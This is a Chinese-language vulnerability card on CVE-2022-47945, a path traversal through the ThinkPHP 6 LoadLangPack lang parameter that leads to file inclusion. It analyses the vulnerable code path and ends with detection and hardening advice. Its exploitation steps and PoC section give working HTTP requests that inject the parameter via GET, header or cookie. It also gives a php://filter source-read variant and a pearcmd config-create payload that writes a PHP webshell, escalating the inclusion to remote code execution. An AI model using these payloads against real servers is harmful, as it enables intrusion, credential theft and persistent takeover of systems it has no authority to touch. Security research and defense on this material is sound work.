---
id: web-php-file-inclusion-thinkphp6-loadlangpack-detect-var-traversal-include
title: ThinkPHP ≤6.0.13 开启多语言后 LoadLangPack 用 get/header/cookie 的 lang 参数拼路径并 include：目录穿越包含任意文件，配 pearcmd 达成 RCE（CVE-2022-47945）
type: scenario
domain: web
path: web/php/file-inclusion
technique: thinkphp6-loadlangpack-lang-traversal-include
tags:
- php
- thinkphp
- file-inclusion
- path-traversal
- lang
- pearcmd
- rce
cve:
- CVE-2022-47945
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: thinkphp<=6.0.13
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:39:16+08:00'
  notes: 已对照原文核对：LoadLangPack::detect 依次取 get/header/cookie 的 lang、allow_lang_list 为空则 range=langset、getThinkPath()+lang+langset+.php 经 Lang::load→parse→include，路径与回显截图一致，pearcmd 升级与 5.1 未打通的边界也已写清；未验证点：原文仅 Windows 本地 6.0.12 复现，pearcmd 变体未实测
url: /docs/web/php/file-inclusion/web-php-file-inclusion-thinkphp6-loadlangpack-detect-var-traversal-include/
draft: false
kb_aliases:
- CVE-2022-47945
- ThinkPHP 多语言 文件包含
- LoadLangPack lang 目录穿越
- detect_var lang 参数
- think\facade\Lang load parse
- pearcmd 文件包含
---

## 一句话结论

ThinkPHP 6.0.13 及以前，只要开启多语言（`app/middleware.php` 里启用 `\think\middleware\LoadLangPack`），`detect()` 就会依次从 **get、请求头、cookie** 里取 `lang` 参数（`detect_var` 配置项），小写后直接作为语言包名拼进 `getThinkPath() . 'lang' . DS . $langset . '.php'` 并交给 `Lang::load()` → `parse()` → `include`；把 `lang` 写成 `../../../../../public/test` 即可包含任意文件（含上传的图片/日志），再配合 pearcmd/`register_argc_argv` 技巧达成 RCE。

## 原理

- **入口中间件**：`\think\middleware\LoadLangPack::handle()` 在请求早期执行，`detect()` 按 `$this->config['detect_var']`（默认 `'lang'`）**依次**遍历 `$request->get()`、`$request->header()`、`$request->cookie()`，取到第一个非空值就停止 —— 三个位置都能注入，GET 最方便。
- **没有白名单**：取到的 `$langSet` 先 `strtolower()`，随后 `if (empty($this->config['allow_lang_list'])) { $range = $langSet; }`。`allow_lang_list` 默认为空数组，所以攻击者的任意字符串直接成为 `$range`；只有配置了 `allow_lang_list` 且值不在列表内时才回落到默认 `zh-cn`。
- **`setLangSet` 与条件**：`Lang::setLangSet($range)` 把私有属性 `$range` 改成攻击者字符串；随后 `if ($langSet != $this->config['default_lang'])`（默认 `zh-cn`）成立，进入 `switchLangSet()` → `$this->load([$lang])`。
- **拼路径**：`Lang::load()` 里 `$file = $this->app->getThinkPath() . 'lang' . DIRECTORY_SEPARATOR . $langset . '.php'`，`$langset` 就是穿越串。例如 `lang=../../../../../public/test` → `<root>/vendor/topthink/framework/src/lang/../../../../../public/test.php`，穿越 5 级正好回到项目根/public。
- **sink 是 include**：`load()` 对每个语言文件 `parse($file)`；`parse()` 先 `pathinfo` 取扩展名（`php` 走 `include`），否则 `file_get_contents`。因为拼接后后缀被强制成 `.php`，所以目标文件必须是"能落成 `xxx.php`"的路径，或者用 `lang=.../test` 使最终路径 `test.php` 指向上传时命名为 `test.php` 的文件；也可用 `lang=php://filter/...` 之类 wrapper（`pathinfo` 对 wrapper 的处理随版本而异，需实测）。
- **为什么能升级为 RCE**：单纯包含只能读/执行已存在的 PHP；经典升级是 `pearcmd.php`（PHP 自带 PEAR 的 `pearcmd.php` 在 `register_argc_argv=On` 时可用 `+config-create` 写文件），路径如 `lang=../../../../../../usr/local/lib/php/pearcmd`，再通过 query string 传 pearcmd 参数；另一条是包含日志/上传图片马（需要能写 `.php` 后缀或包含已有 `<?php` 的文件）。
- **5.1 的差异**：ThinkPHP 5.1 对应开关是 `config/app.php` 的 `lang_switch_on=true`，但原文实测本地未复现成功（`$langSet = $this->range` 被设回 `zh-cn`），说明 5.1 的取值链路与 6.x 不同，不能照搬。

## 触发条件

- 目标 ThinkPHP ≤6.0.13，且 `app/middleware.php` 启用了 `\think\middleware\LoadLangPack`（默认模板里是注释状态，需要开发者手动打开）。
- `allow_lang_list` 未配置或为空（默认即如此）。
- 已知服务器上存在可包含的 PHP 文件（上传点、日志、`pearcmd.php`、`test.php` 等），或能通过 `php://filter` 等 wrapper 读到源码。
- 若走 pearcmd 升级，需要 `register_argc_argv=On` 且 PEAR 安装路径已知。

## 利用步骤

1. 探测是否开启多语言：请求 `?lang=../../../../../public/test`（假设 `public/test.php` 存在），观察响应是否包含该文件内容/是否执行其中代码。
2. 换位置注入：GET 不生效时试 `lang: ../../...` 请求头、`Cookie: lang=../../...`（`detect()` 依次覆盖三处）。
3. 定位可包含目标：读 `public/index.php`、`config/app.php`、`route/app.php` 确认路径深度；用 `lang=../../../../../public/<file>` 依次试探上传目录、`runtime/log` 日志。
4. 升级为写入：若 `register_argc_argv=On` 且存在 `pearcmd.php`，用 `lang=../../../../../../usr/local/lib/php/pearcmd&+config-create+/&file=/var/www/html/shell.php&/<?=eval($_POST[1]);?>+` 之类写马（具体参数随 pearcmd 版本）。
5. 若无法写文件，退化为源码/配置读取（数据库口令、密钥），再找其他入口。

## PoC

```http
GET /public?lang=../../../../../public/test HTTP/1.1
Host: target
```

拼接后的实际路径（Windows 本地靶场示例）：

```text
D:\phpstudy_pro\WWW\think\vendor\topthink\framework\src\lang\../../../../../public/test.php
```

请求头/cookie 位置变体：

```http
GET /public HTTP/1.1
Host: target
lang: ../../../../../public/test
```

```http
GET /public HTTP/1.1
Host: target
Cookie: lang=../../../../../public/test
```

pearcmd 升级（需 `register_argc_argv=On`）：

```text
/public?lang=../../../../../../usr/local/lib/php/pearcmd&+config-create+/&file=/var/www/html/shell.php&/<?=eval($_POST[1]);?>+
```

## 变体与关联

- 变体：`lang` 换成 `php://filter/convert.base64-encode/resource=../config/database`（部分版本 `pathinfo` 仍能取到 `php` 后缀则走 include，否则走 `file_get_contents`，需实测），可直接读源码。
- 变体：目标文件后缀不满足 `.php` 时，用上传点把文件命名为 `xxx.php`，或包含 `runtime/log` 里已写入的 PHP 片段（日志包含需日志内容含 PHP 代码）。
- 关联：[[web-php-file-inclusion-thinkphp-view-template]]（ThinkPHP 5.0.x 的模板路径包含，sink 同为 `include`）、[[web-php-file-inclusion-pearcmd-argv-config-create-webshell]]（pearcmd 写入的通用手法）、[[web-php-framework-thinkphp-debug-sql-error-env-credential-leak]]（同框架的报错信息泄露，可用于定位路径）。
- 边界：未启用 `LoadLangPack`、配置了 `allow_lang_list` 且严格校验、`lang` 参数被前置 WAF 拦截、或无可包含目标时链不成立；5.1 的 `lang_switch_on` 路径不能直接复用本卡。

## 检测与防御

- 修复：升级到 6.0.14+；若必须用多语言，配置 `allow_lang_list` 白名单并校验，不要直接把 `lang` 拼进路径。
- 加固：对 `lang` 参数做 `[a-z0-9_-]` 白名单校验，禁用 `../`、`php://`、绝对路径；`Lang::load` 前做 `realpath` 并限定在语言目录内。
- 运行层：`register_argc_argv=Off`（禁 pearcmd 技巧）；上传目录不可被 include；`open_basedir` 限制语言目录。
- 检测：请求的 get/header/cookie 中出现 `lang=` 携带 `../`、`php://`、`pearcmd`、`config-create`；`include`/`file_get_contents` 读取了语言目录之外的路径；随后出现新增 `.php` 文件或子进程。
